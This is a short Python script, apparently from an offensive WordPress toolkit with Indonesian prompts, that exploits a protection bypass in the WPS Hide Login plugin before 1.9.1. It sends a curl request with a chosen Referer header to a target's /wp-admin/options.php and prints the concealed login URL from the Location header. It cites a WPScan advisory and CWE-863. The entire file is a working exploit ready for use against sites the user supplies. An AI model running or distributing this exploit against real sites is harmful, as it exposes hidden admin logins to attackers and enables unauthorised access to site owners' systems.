import subprocess
import re

#WPS Hide Login < 1.9.1 - (Protection Bypass with Referer-Header)
def zxWPS_191():

   referer = input((("""
┌──[𝙯HaEN✘]-[Masukkan Random Referer]
└─➣  """)))
   url = input((("""
┌──[𝙯HaEN✘]-[Masukkan Url]
└─➣  """)))

   # Pastikan URL diakhiri dengan (/) jika tidak
   if not url.endswith("/"):
      url += "/"

   # Gabungkan URL dengan /wp-admin/options.php
   url += "wp-admin/options.php"

   # Definisikan perintah Curl
   curl_command = ["curl", "--referer", referer, "-sIXGET", url]

   # Jalankan perintah Curl
   result = subprocess.run(curl_command, capture_output=True, text=True)

   # Cek hasil
   if result.returncode == 0:
      # Cari nilai dari header 'Location' menggunakan ekspresi reguler
      location_match = re.search(r"Location: (.+)", result.stdout)
      if location_match:
         location = location_match.group(1)
         print("\nLocation   ::", location)
         print("Reference  :: https://wpscan.com/vulnerability/15bb711a-7d70-4891-b7a2-c473e3e8b375/")
         print("CWE        :: CWE-863 / CVSS medium(5.3)\n")
      else:
         print(f"\nGagal Bypass.! Location login tidak ditemukan / versi WPS Hide Login diatas 1.9.1.")
   else:
      print("Error:", result.stderr)